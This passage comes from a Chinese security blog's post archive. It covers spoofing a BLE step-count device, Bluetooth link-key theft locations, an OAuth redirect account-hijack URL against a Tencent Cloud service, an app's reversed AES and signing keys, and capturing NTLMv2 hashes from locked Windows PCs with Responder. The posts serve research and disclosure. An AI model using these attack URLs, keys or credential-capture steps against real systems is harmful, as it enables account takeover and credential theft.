gatt.ResponseWriter, req *gatt.ReadRequest) &#123; log.Println(\"Read: 0xFEA1\") rsp.Write(steps) &#125;) c0.HandleNotifyFunc( func(r gatt.Request, n gatt.Notifier) &#123; go func() &#123; n.Write(steps) log.Printf(\"Indicate 0xFEA2\") &#125;() &#125;) c1 := s0.AddCharacteristic(gatt.UUID16(0xFEA2)) c1.HandleReadFunc( func(rsp gatt.ResponseWriter, req *gatt.ReadRequest) &#123; log.Println(\"Read: 0xFEA2\") rsp.Write(steps) &#125;) c1.HandleNotifyFunc( func(r gatt.Request, n gatt.Notifier) &#123; go func() &#123; n.Write(steps) log.Printf(\"Indicate 0xFEA2\") &#125;() &#125;) c1.HandleWriteFunc( func(r gatt.Request, data []byte) (status byte) &#123; log.Println(\"Wrote 0xFEA2:\", string(data)) return gatt.StatusSuccess &#125;) c2 := s0.AddCharacteristic(gatt.UUID16(0xFEC9)) c2.HandleReadFunc( func(rsp gatt.ResponseWriter, req *gatt.ReadRequest) &#123; log.Println(\"Read: 0xFEC9\") rsp.Write(mac) &#125;) d.AddService(s0) // Advertise device name and service's UUIDs. a := &amp;gatt.AdvPacket&#123;&#125; a.AppendFlags(flagGeneralDiscoverable | flagLEOnly) a.AppendUUIDFit([]gatt.UUID&#123;s0.UUID()&#125;) a.AppendName(\"salt\") // company id and data, MAC Address // https://www.bluetooth.com/specifications/assigned-numbers/company-identifiers a.AppendManufacturerData(0x2333, mac) d.Advertise(a) default: &#125; &#125; d.Init(onStateChanged) select &#123;&#125;&#125; 另外看到国内有人用nodejs实现了类似的功能。 注意node版本需要大于0.12，另外bleno版本需要为0.4.0。 12sudo apt-get install libusb-1.0-0-devnpm install bleno@0.4.0 参考文献http://iot.weixin.qq.com/wiki/new/index.html?page=4-3https://github.com/luluxie/weixin-iothttps://github.com/paypal/gatt","categories":[{"name":"radio","slug":"radio","permalink":"http://5alt.me/categories/radio/"}],"tags":[],"keywords":[{"name":"radio","slug":"radio","permalink":"http://5alt.me/categories/radio/"}]},{"title":"蓝牙安全初探","slug":"蓝牙安全初探","date":"2016-11-29T16:00:00.000Z","updated":"2019-08-16T04:24:28.788Z","comments":true,"path":"2016/11/蓝牙安全初探/","link":"","permalink":"http://5alt.me/2016/11/蓝牙安全初探/","excerpt":"传统蓝牙设备的攻击蓝牙可能用来传输一些隐私的数据，有时候还需要在两个设备靠近时自动连接，因此引入了配对和绑定。 蓝牙配对模式Numeric Comparison：配对双方都显示一个6位的数字，由用户来核对数字是否一致，一致即可配对。例如手机之间的配对。Just Works：用于配对没有显示没有输入的设备，主动发起连接即可配对，用户看不到配对过程。例如连接蓝牙耳机。Passkey Entry：要求配对目标输入一个在本地设备上显示的6位数字，输入正确即可配对。例如连接蓝牙键盘。Out of Band：两设备的通过别的途径交换配对信息，例如NFC等。例如一些NFC蓝牙音箱。","text":"传统蓝牙设备的攻击蓝牙可能用来传输一些隐私的数据，有时候还需要在两个设备靠近时自动连接，因此引入了配对和绑定。 蓝牙配对模式Numeric Comparison：配对双方都显示一个6位的数字，由用户来核对数字是否一致，一致即可配对。例如手机之间的配对。Just Works：用于配对没有显示没有输入的设备，主动发起连接即可配对，用户看不到配对过程。例如连接蓝牙耳机。Passkey Entry：要求配对目标输入一个在本地设备上显示的6位数字，输入正确即可配对。例如连接蓝牙键盘。Out of Band：两设备的通过别的途径交换配对信息，例如NFC等。例如一些NFC蓝牙音箱。在老的蓝牙2.0协议中，配对过程需要输入一个PIN码，长度可以从4到16个数字。（很多设备默认0000或者1234） 在配对的过程中通过PIN码来生成Linkkey。两个配对后的设备共享一个Linkkey，这个行为叫绑定。绑定之后下次两个设备接近后，用Linkkey进行认证，认证通过后生成EncryptionKey进行session的加密。认证的过程采用challenge-response的模式，以claimant and the verifier的方式来验证linkkey。认证完一方之后交换身份，再认证另一方。 攻击方式由于设备绑定后通信是内容默认经过加密的，因此很难嗅探到敏感的信息。常用的攻击方式有如下几种。 嗅探配对过程获取PIN配对的过程会用PIN生成随机数进行互相认证，而PIN只有很小的范围，可以通过爆破PIN来获取真正的PIN，以及通过中间计算的值得到Linkkey以及EncryptionKey，用于以后的配对和通信解密。破解PIN用到的工具叫crackle。 重放攻击蓝牙没有时间戳，可以重放流量。对于蓝牙键盘通过频率可以大致猜测流量对应什么按键。当然也可以实施其他攻击。 在获取Linkkey前提下模拟设备如果能获取到Linkkey，则可以更改蓝牙mac地址模拟成一方的设备，与另一方连接。如果模拟成设备与手机连接，能获取到通话记录，说不定还能获取到整个通讯录。 linkkey位置注意在有的平台上linkkey显示是反的 安卓/data/misc/bluetoothd/XX:XX:XX:XX:XX:XX/linkkeys/date/misc/bluedroid/bt_config.xml windowspsexec -s -i regedit.exeHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\BTHPORT\\Parameters\\Keys linux/var/lib/Bluetooth/[BD_ADDR]/linkkeys其他文件可以参考http://manpages.ubuntu.com/manpages/precise/man8/bluetoothd.8.html osxsudo defaults read /private/var/root/Library/Preferences/blued.plist 其他攻击其他攻击如蓝牙中间人、mac地址爆破、PIN爆破等暂时不提及。蓝牙中间人可参考https://github.com/securing/gattacker 和 https://github.com/DigitalSecurity/btlejuice BLE设备GATT协议的攻击GATT协议可以在蓝牙设备不完成配对的情况下进行访问，因此，通信流量明文传输，如果应用层没有加密或者校验，则可以被轻易地嗅探和伪造数据。 GATT中一般有多个Service，一个Service中有多个Characteristic。Service和Characteristic都有一个唯一的UUID。一般一个Service对应一个功能，蓝牙标准里预先定义了一些UUID用作固定的用途，比如电量、心率等。Characteristic相当于Service的一个项，有read、write、indicate、notify几种属性，可以对这项的值进行读写和通知的功能。厂商也可能实现一些私有的Service，用私有的协议进行通信。如果这些通信协议没有加密或者校验，则很有可能受到攻击。 蓝牙嗅探我用的是NRF51822，不过只支持windows平台，只支持BLE。该方案被动嗅探数据包，为了防止丢包，需要在不busy的USB bus上，并避免在虚拟机里使用。 当然，攻击蓝牙设备是一方面，还可以伪造成蓝牙设备来对客户端做一些欺骗。比如可以用一个usb蓝牙接收器伪装成一个蓝牙运动手环，来欺骗微信运动。 参考文献https://linuxtoy.org/archives/ubuntu-bluetooth-guide.htmlhttp://www.race604.com/gatt-profile-intro/https://www.bluetooth.com/specifications/generic-attributes-overviewhttp://www.tuicool.com/articles/ayaYfmUhttps://github.com/adafruit/Adafruit_BLESniffer_Python","categories":[{"name":"radio","slug":"radio","permalink":"http://5alt.me/categories/radio/"}],"tags":[],"keywords":[{"name":"radio","slug":"radio","permalink":"http://5alt.me/categories/radio/"}]},{"title":"搭建简单的Smtp Server","slug":"搭建简单的SmtpServer","date":"2016-11-21T16:00:00.000Z","updated":"2019-08-16T04:24:28.787Z","comments":true,"path":"2016/11/搭建简单的SmtpServer/","link":"","permalink":"http://5alt.me/2016/11/搭建简单的SmtpServer/","excerpt":"有些时候需要构造一些特殊的邮件地址，而很多邮箱提供商不支持过长或者支持Unicode字符以及有特殊符号的邮箱用户名，这时候就需要自己搭建一个能收取邮件的服务器。市面上有很多大型的搭建邮件服务器的方案，比较复杂，不适合在实际安全检测中使用，于是自己用python脚本实现了一个简单的方案。","text":"有些时候需要构造一些特殊的邮件地址，而很多邮箱提供商不支持过长或者支持Unicode字符以及有特殊符号的邮箱用户名，这时候就需要自己搭建一个能收取邮件的服务器。市面上有很多大型的搭建邮件服务器的方案，比较复杂，不适合在实际安全检测中使用，于是自己用python脚本实现了一个简单的方案。1234567891011121314151617181920212223242526272829import SocketServerclass MyTCPHandler(SocketServer.BaseRequestHandler): def handle(self): self.request.sendall(&quot;220 Salt Mail System\\n&quot;) self.request.recv(1024) self.request.sendall(&quot;235 Authentication successful\\n&quot;) while True: data = self.request.recv(1024).strip() if data[:4].lower() == &apos;data&apos;: self.request.sendall(&quot;354 End data with .\\n&quot;) content = &apos;&apos; while True: tmp = self.request.recv(1024).strip() content += tmp if tmp.split(&apos;\\n&apos;)[-1] == &apos;.&apos;: break print content self.request.sendall(&quot;250 Mail OK\\n&quot;) self.request.close() return else: print data self.request.sendall(&quot;250 Mail OK\\n&quot;)if __name__ == &quot;__main__&quot;: HOST, PORT = &quot;0.0.0.0&quot;, 25 server = SocketServer.TCPServer((HOST, PORT), MyTCPHandler) server.serve_forever() 参考资料http://xdxd.love/2016/10/17/unicode%E5%90%8C%E5%BD%A2%E5%AD%97%E5%BC%95%E8%B5%B7%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/","categories":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}],"tags":[],"keywords":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}]},{"title":"腾讯云助手用户帐号劫持","slug":"腾讯云微信公告平台oauth漏洞","date":"2016-11-10T16:00:00.000Z","updated":"2019-08-16T04:24:28.788Z","comments":true,"path":"2016/11/腾讯云微信公告平台oauth漏洞/","link":"","permalink":"http://5alt.me/2016/11/腾讯云微信公告平台oauth漏洞/","excerpt":"之前在检测腾讯云安全的时候发现了一个oauth的问题，可以导致账号劫持。 问题出现微信腾讯云助手公共号的登陆上。在按照oauth2的标准，redirect_uri需要检查返回地址的host，微信的回调api严格检查了回调地址的host必须为login.cm.qcloud.com。但是，由于这个回调地址又做了一次重定向，这个重定向对host解析有误，导致oauth的code以及用于腾讯云助手的session泄露，让攻击者可以以受害者的身份登录。 攻击测试url:http://sz.open.weixin.qq.com/connect/oauth2/authorize?appid=wx32d9ff109a3f81eb&amp;redirect_uri=http%3A%2F%2Flogin.cm.qcloud.com%2Fauth%2Fredirect%3FandBind%3D0%26type%3Dweixin%26env%3Dproduct%26r%3Dao8tj%26redirect%3Dhttp%253A%252F%252F5alt.me%3f@yun.weixin.qcloud.com%252Findex%252Fcvmlist%253Ffrom_wx_login%253D1%26from_wx_oauth%3D1&amp;response_type=code&amp;scope=snsapi_base发现会携带敏感信息跳转到攻击者受控的域名5alt.me上。 当然由于微信的安全机制，跳转到恶意域名会有一个中转页面，阻止进一步的跳转。但是经过测试，微信并没有拦截新浪云的二级域名。如果攻击者在新浪云注册5alt.sinaapp.com的应用并部署记录代码，即可从referer里获取oauth2返回的code并且从url里获取认证之后的session，从而登陆受害者的腾讯云助手页面。","text":"之前在检测腾讯云安全的时候发现了一个oauth的问题，可以导致账号劫持。 问题出现微信腾讯云助手公共号的登陆上。在按照oauth2的标准，redirect_uri需要检查返回地址的host，微信的回调api严格检查了回调地址的host必须为login.cm.qcloud.com。但是，由于这个回调地址又做了一次重定向，这个重定向对host解析有误，导致oauth的code以及用于腾讯云助手的session泄露，让攻击者可以以受害者的身份登录。 攻击测试url:http://sz.open.weixin.qq.com/connect/oauth2/authorize?appid=wx32d9ff109a3f81eb&amp;redirect_uri=http%3A%2F%2Flogin.cm.qcloud.com%2Fauth%2Fredirect%3FandBind%3D0%26type%3Dweixin%26env%3Dproduct%26r%3Dao8tj%26redirect%3Dhttp%253A%252F%252F5alt.me%3f@yun.weixin.qcloud.com%252Findex%252Fcvmlist%253Ffrom_wx_login%253D1%26from_wx_oauth%3D1&amp;response_type=code&amp;scope=snsapi_base发现会携带敏感信息跳转到攻击者受控的域名5alt.me上。 当然由于微信的安全机制，跳转到恶意域名会有一个中转页面，阻止进一步的跳转。但是经过测试，微信并没有拦截新浪云的二级域名。如果攻击者在新浪云注册5alt.sinaapp.com的应用并部署记录代码，即可从referer里获取oauth2返回的code并且从url里获取认证之后的session，从而登陆受害者的腾讯云助手页面。造成这个问题的原因猜测是腾讯云用了类似php中parse_url这样的函数来解析回调的地址，获取主机域名。 123456789php &gt; var_dump(parse_url(&apos;http://5alt.me\\@qcloud.com&apos;));array(3) &#123; [&quot;scheme&quot;]=&gt; string(4) &quot;http&quot; [&quot;host&quot;]=&gt; string(10) &quot;qcloud.com&quot; [&quot;user&quot;]=&gt; string(8) &quot;5alt.me\\&quot;&#125; 由代码运行结果可知，函数对http://5alt.me\\@qcloud.com解析的host为qcloud.com，而由于各个浏览器对协议的理解不同，Chrome和Safari都会访问到http://5alt.me，而只有Firefox会访问到qcloud.com。（IE是什么？怎么从来没听说过？）而微信使用的是Chrome的内核，利用这个性质，可以成功在微信里发起这个攻击。","categories":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}],"tags":[],"keywords":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}]},{"title":"e乐充app数据包加解密和签名算法","slug":"e乐充app数据包加解密和签名算法","date":"2016-11-02T16:00:00.000Z","updated":"2019-08-16T04:24:28.784Z","comments":true,"path":"2016/11/e乐充app数据包加解密和签名算法/","link":"","permalink":"http://5alt.me/2016/11/e乐充app数据包加解密和签名算法/","excerpt":"将APP的流量代理出来，抓包发现虽然走的是https，但没有验证证书，burpsuite可以抓到请求的内容，不过请求和响应的内容都加密了。逆向apk，发现用AES加密之后base64编码了一下，签名是拼接参数算md5。简单用python模拟了这个加解密的过程。敏感信息已打码。 分析充值的逻辑，发现手机只是充当了一个代理的作用，将卡片和充值服务器连接起来，与卡交互的流量是加密的。北京的公交卡采用的是NXP MIFARE DESFire的卡，用DES/3DES加密，无法获取到密钥破解卡片。 充值的订单与一卡通的卡号绑定，无法给其他的卡片充值，所以无法通过遍历未完成订单的方法来给自己充值。 尝试在写入一部分数据后移走卡片，此时查询卡片余额已经充值成功，订单仍然处于未完成的状态，但是此时已经无法退款，只能选择继续完成写卡。 到此为止没有其他的利用思路了，只能老老实实花钱充卡了。。","text":"将APP的流量代理出来，抓包发现虽然走的是https，但没有验证证书，burpsuite可以抓到请求的内容，不过请求和响应的内容都加密了。逆向apk，发现用AES加密之后base64编码了一下，签名是拼接参数算md5。简单用python模拟了这个加解密的过程。敏感信息已打码。 分析充值的逻辑，发现手机只是充当了一个代理的作用，将卡片和充值服务器连接起来，与卡交互的流量是加密的。北京的公交卡采用的是NXP MIFARE DESFire的卡，用DES/3DES加密，无法获取到密钥破解卡片。 充值的订单与一卡通的卡号绑定，无法给其他的卡片充值，所以无法通过遍历未完成订单的方法来给自己充值。 尝试在写入一部分数据后移走卡片，此时查询卡片余额已经充值成功，订单仍然处于未完成的状态，但是此时已经无法退款，只能选择继续完成写卡。 到此为止没有其他的利用思路了，只能老老实实花钱充卡了。。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#coding = utf-8import base64from hashlib import md5from urllib import unquote,quotefrom Crypto.Cipher import AESimport urlparseimport requestsBS = 16key = &apos;effb457b-f4a8-4a99-8a7d-539dbe8f05e9&apos;[:BS]pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)unpad = lambda s : s[:-ord(s[len(s)-1:])]class AESCipher: def __init__(self): self.key = &quot;effb457b-f4a8-4a99-8a7d-539dbe8f05e9&quot;[:BS] def encrypt(self, raw): raw = pad(raw) iv = &quot;0102030405060708&quot; cipher = AES.new(self.key, AES.MODE_CBC, iv) return base64.b64encode(cipher.encrypt(raw)) def decrypt(self, enc): enc = base64.urlsafe_b64decode(enc.replace(&apos;\\n&apos;, &apos;&apos;).encode(&apos;utf-8&apos;)) iv = &quot;0102030405060708&quot; cipher = AES.new(self.key, AES.MODE_CBC, iv) return unpad(cipher.decrypt(enc))def sign(msgType, data): return md5(&apos;msgType=%s&amp;data=%s&amp;key=116107e6-b71f-42da-898a-06b99f48a07d&apos;%(msgType, data)).hexdigest().upper()def req(msgType, data): data = AESCipher().encrypt(data) sig = sign(msgType, data) return &apos;msgType=%s&amp;data=%s&amp;sign=%s&amp;client=NFC&amp;token=xxxxx&amp;cardNo=xxxxx&amp;ver=003&amp;headmodel=xxx&amp;phoneType=NFC&amp;pda=xxx&amp;headimei=xxx&amp;clientVer=2.0.14&amp;citycode=1&amp;cardAttr=&apos;%(msgType, quote(data), sig)# 加密签名并请求msgType = &apos;0256&apos;data = &apos;&#123;&quot;orderCode&quot;:&quot;WXNFC-xxx&quot;,&quot;type&quot;:&quot;&quot;,&quot;apdu&quot;:&quot;&quot;,&quot;nowBalance&quot;:&quot;&quot;,&quot;oldBalance&quot;:&quot;&quot;,&quot;refundType&quot;:&quot;&quot;&#125;&apos;headers = &#123;&apos;USER-AGENT&apos;: &apos;Android 6.0.1&apos;, &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;&#125;res_body = requests.post(&apos;http://www.hzt360.com/phoneManager&apos;, data=req(msgType, data), headers=headers).text#print res_body# 解密print AESCipher().decrypt(urlparse.parse_qs(res_body)[&apos;data&apos;][0].replace(&apos; &apos;, &apos;+&apos;))","categories":[{"name":"Android","slug":"Android","permalink":"http://5alt.me/categories/Android/"}],"tags":[],"keywords":[{"name":"Android","slug":"Android","permalink":"http://5alt.me/categories/Android/"}]},{"title":"用安卓手机获取锁屏下windows电脑的登陆密码hash","slug":"用安卓手机获取锁屏下windows电脑的登陆密码hash","date":"2016-10-27T16:00:00.000Z","updated":"2019-08-16T04:24:28.788Z","comments":true,"path":"2016/10/用安卓手机获取锁屏下windows电脑的登陆密码hash/","link":"","permalink":"http://5alt.me/2016/10/用安卓手机获取锁屏下windows电脑的登陆密码hash/","excerpt":"之前看了一篇将USB模拟成网卡然后获取NTLMv2 Hash的文章，原文是通过一个装有Linux系统的USB设备来实现这一攻击。其基本思路是劫持电脑的流量，使其访问SMB协议的地址，那么SMB服务器就能获取到当前的用户名和密码的NTLMv2 Hash。攻击使用了Responser这个工具，来完成流量的劫持和SMB服务器的搭建。 如果没有一个这样的USB设备就不能完成这个攻击了么？答案当然是否定的。安卓手机有一个共享网络的功能，开启这个功能即可把安卓手机模拟成一个网卡设备。在安卓（需要root权限）上chroot运行一个linux系统，执行Responser，这样就能得到同样的攻击效果。","text":"之前看了一篇将USB模拟成网卡然后获取NTLMv2 Hash的文章，原文是通过一个装有Linux系统的USB设备来实现这一攻击。其基本思路是劫持电脑的流量，使其访问SMB协议的地址，那么SMB服务器就能获取到当前的用户名和密码的NTLMv2 Hash。攻击使用了Responser这个工具，来完成流量的劫持和SMB服务器的搭建。 如果没有一个这样的USB设备就不能完成这个攻击了么？答案当然是否定的。安卓手机有一个共享网络的功能，开启这个功能即可把安卓手机模拟成一个网卡设备。在安卓（需要root权限）上chroot运行一个linux系统，执行Responser，这样就能得到同样的攻击效果。 安卓安装linux系统使用linux depoly可很方便的安装linux系统。linux depoly依赖busybox。 安装 busyboxhttps://github.com/meefik/busybox/releases 安装 linux depolyhttps://github.com/meefik/linuxdeploy/releases 在linux depoly中选择快的源http://202.141.160.110/kali/http://mirrors.163.com/ubuntu/ 安装路径选择实际可用的一个路径/storage/emulated/legacy/linux.img 然后安装即可。 安装Responderssh到linux系统中，安装Responder以及所需的依赖。 123apt-get install -y python git python-pip python-dev screen sqlite3pip install pycryptogit clone https://github.com/spiderlabs/responder root下运行Responder 1python Responder.py -I rndis0 -f -w -r -d -F 这样USB插入锁屏Windows，开启热点共享功能，一会就能抓到用户的认证信息了。认证信息存储在Responder产生的sqlite的数据库里，select * from responder;即可看到记录的凭据。 破解NTLMv2 Hash根据NTLMv2 Hash的算法，来自client的challenge是无法确定的，因此无法用彩虹表的方式来破解NTLMv2 Hash。但是如果有字典的话还是可以暴力破解的。下面是一个生成NTLMv2 Hash的样例程序。 123456789101112&lt;?phpfunction GenerateNTLMv2($password, $account, $domain, $client_challenge, $server_challenge) &#123; $unicode_password= iconv ( &apos;UTF-8&apos;, &apos;UTF-16LE&apos;, $password ); $NTLM_Key = mhash ( MHASH_MD4, $unicode_password); $NTLM_Hash = mhash ( MHASH_MD5, iconv ( &apos;UTF-8&apos;, &apos;UTF-16LE&apos;, strtoupper ( $account ) . $domain ), $NTLM_Key ); $NTLM_Chal_Hash = mhash ( MHASH_MD5, pack ( &quot;H*&quot;, $server_challenge . $client_challenge ), $NTLM_Hash ); return strtoupper ( bin2hex ( $NTLM_Chal_Hash ) );&#125;//$account::$domain:$server_challenge:$NTLMv2hash:$client_challenge 参考文献http://witch.valdikss.org.ru/https://room362.com/post/2016/snagging-creds-from-locked-machines/https://github.com/samyk/poisontap","categories":[{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"http://5alt.me/categories/奇技淫巧/"}],"tags":[],"keywords":[{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"http://5alt.me/categories/奇技淫巧/"}]},{"title":"Hello World","slug":"HelloWorld","date":"2016-10-26T16:00:00.000Z","updated":"2019-08-16T04:24:28.784Z","comments":true,"path":"2016/10/HelloWorld/","link":"","permalink":"http://5alt.me/2016/10/HelloWorld/","excerpt":"","text":"换个模板从头再来","categories":[{"name":"杂","slug":"杂","permalink":"http://5alt.me/categories/杂/"}],"tags":[],"keywords":[{"name":"杂","slug":"杂","permalink":"http://5alt.me/categories/杂/"}]}]}